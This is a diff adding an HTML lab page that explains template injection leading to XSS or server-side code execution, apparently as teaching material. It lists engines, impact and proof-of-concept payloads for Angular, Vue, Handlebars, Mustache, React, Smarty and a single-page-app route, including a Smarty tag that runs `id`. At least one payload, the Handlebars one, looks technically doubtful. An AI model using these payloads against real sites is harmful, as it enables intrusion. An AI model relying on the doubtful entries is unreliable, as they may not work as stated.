@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Template Injection</title>
+    <style>
+        :root{--bg:#0d0f17;--surface:#13151c;--text:#a0a8b8;--accent:#7aa2f7;--border:#24283b;--cyan:#7dcfff;--green:#9ece6a;--yellow:#e0af68;}
+        *{box-sizing:border-box;margin:0;padding:0;}
+        body{font-family:"Cascadia Code","Fira Mono",Consolas,monospace;background:var(--bg);color:var(--text);font-size:14px;line-height:1.6;min-height:100vh;}
+        .bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;justify-content:space-between;position:sticky;top:0;z-index:10;}
+        .bar span{color:var(--accent);}
+        .wrap{max-width:960px;margin:auto;padding:2rem 1rem;}
+        .prompt{color:var(--green);}.cmd{color:var(--yellow);}
+        h1,h2,h3{color:var(--accent);margin-top:1.5rem;margin-bottom:.5rem;}
+        h1{font-size:1.4rem;}h2{font-size:1.2rem;}h3{font-size:1.05rem;}
+        code{background:var(--surface);border:1px solid var(--border);padding:2px 4px;border-radius:3px;color:var(--yellow);font-size:13px;}
+        pre{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:.75rem 1rem;overflow-x:auto;margin:.5rem 0;}
+        ul{margin-left:1.2rem;margin-top:.5rem;}li{margin-bottom:.25rem;}
+        footer{text-align:center;padding:2rem 0;color:var(--cyan);font-size:12px;}
+    </style>
+</head>
+<body>
+<div class="bar"><span>user@lab</span><span>~/xss/10-template-injection</span></div>
+<main class="wrap">
+    <h1>Template Injection → XSS</h1>
+
+    <h2>What template injection is</h2>
+    <p>User data lands inside server-side or client-side template syntax; engine evaluates it as code → RCE or XSS.</p>
+
+    <h2>Why it happens</h2>
+    <p>Templates treat user input as part of the template grammar (placeholders, helpers, filters) instead of pure data.</p>
+
+    <h2>Where you’ll meet it</h2>
+    <p>Server: Smarty, Twig, Jinja, Velocity, ERB. Client: AngularJS, Vue, Mustache, Handlebars. Edge: PDF templates, email composers.</p>
+
+    <h2>Impact</h2>
+    <p>Server-side RCE (Smarty {php}), client-side XSS (Angular {{}}), supply-chain back-door (see 2021 Twig RCE in Symfony).</p>
+
+    <h2>Mini case-study</h2>
+    <p>2020 Shopify Summer-of-Images app — Liquid template injection → server-side RCE → $50 000 bounty.</p>
+
+    <h2>Payloads</h2>
+    <!-- Angular scope escape -->
+    <pre><code>// Call global constructor
+{{constructor.constructor('alert(1)')()}}</code></pre>
+
+    <!-- Vue v-html -->
+    <pre><code>// v-html renders raw HTML
+&lt;div v-html="user"&gt;&lt;/div&gt;  // user = '&lt;script&gt;alert(1)&lt;/script&gt;'</code></pre>
+
+    <!-- Handlebars helper abuse -->
+    <pre><code>// @index gives array iterator → prototype pollution
+{{@index.constructor.prototype.eval='alert(1)'}}</code></pre>
+
+    <!-- Mustache lambda -->
+    <pre><code>// If lambda is Function() → exec
+{{#lambda}}alert(1){{/lambda}}</code></pre>
+
+    <!-- React danger -->
+    <pre><code>// Explicit raw HTML
+&lt;div dangerouslySetInnerHTML={{__html: user}} /&gt;</code></pre>
+
+    <!-- Smarty legacy -->
+    <pre><code>// Old Smarty allows PHP
+{php}echo `id`;{/php}</code></pre>
+
+    <!-- Client SPA -->
+    <pre><code>// Route param written with document.write
+route('/user/:name',ctx=>document.write(ctx.params.name))  // name = "&lt;script&gt;..."</code></pre>
+
+    <h3>Further reading</h3>
+    <ul>
+        <li><a href="https://book.hacktricks.xyz/pentesting-web/ssti" style="color:var(--cyan)">HackTricks — SSTI</a></li>
+    </ul>
+</main>
+<footer><span>EOF ── happy hacking :)</span></footer>
+</body>
+</html>
